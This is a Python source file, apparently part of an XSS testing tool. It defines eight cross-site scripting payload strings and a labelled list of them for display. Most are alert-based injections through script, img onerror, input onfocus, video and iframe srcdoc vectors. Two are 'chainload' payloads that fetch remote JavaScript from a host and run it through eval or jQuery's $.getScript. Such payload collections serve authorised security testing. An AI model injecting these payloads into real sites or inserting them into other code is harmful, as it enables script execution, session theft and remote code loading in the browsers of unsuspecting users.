def basic_script():
    return "<script>alert('XSS 1');</script>"

def javascript_uri():
    return "javascript:alert('XSS 2');"

def input_onfocus():
    return "<input onfocus='alert(\"XSS 3\")'>"

def image_onerror():
    return "<img src='x' onerror='alert(\"XSS 4\")'>"

def video_source():
    return "<video><source onerror='alert(\"XSS 5\")'></video>"

def iframe_srcdoc():
    return "<iframe srcdoc='<script>alert(\"XSS 6\")</script>'></iframe>"

def xmlhttprequest_load():
    return '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://example.com");a.send();</script>'

def jquery_chainload():
    return '<script>$.getScript("https://example.com")</script>'

# Define payload details
payload_functions = [
    ('basic_script', 'Basic <code>&lt;script&gt;</code> Tag Payload', 'Classic payload', basic_script()),
    ('javascript_uri', '<code>javascript:</code> URI Payload', 'Link-based XSS', javascript_uri()),
    ('input_onfocus', '<code>&lt;input&gt;</code> Tag Payload', 'HTML5 input-based payload', input_onfocus()),
    ('image_onerror', '<code>&lt;img&gt;</code> Tag Payload', 'Image-based payload', image_onerror()),
    ('video_source', '<code>&lt;video&gt;&lt;source&gt;</code> Tag Payload', 'Video-based payload', video_source()),
    ('iframe_srcdoc', '<code>&lt;iframe srcdoc=</code> Tag Payload', 'iframe-based payload', iframe_srcdoc()),
    ('xmlhttprequest_load', 'XMLHttpRequest Payload', 'Inline execution chainload payload', xmlhttprequest_load()),
    ('jquery_chainload', '<code>$.getScript()</code> (jQuery) Payload', 'Chainload payload for sites with jQuery', jquery_chainload()),
]
